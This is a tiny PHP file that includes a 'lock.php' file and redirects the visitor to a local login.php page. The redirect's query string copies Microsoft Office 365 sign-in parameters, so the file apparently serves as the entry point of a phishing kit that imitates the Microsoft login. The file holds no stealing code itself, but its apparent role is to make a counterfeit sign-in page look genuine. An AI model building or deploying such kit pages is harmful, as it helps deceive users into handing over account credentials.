<?php
	include "../../x/lock.php";
	header("location: login.php?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https://products.office.com/en/home/ms.ur?office365com&rtc&1&lc=1033&id=290950&aadredir=1");
?>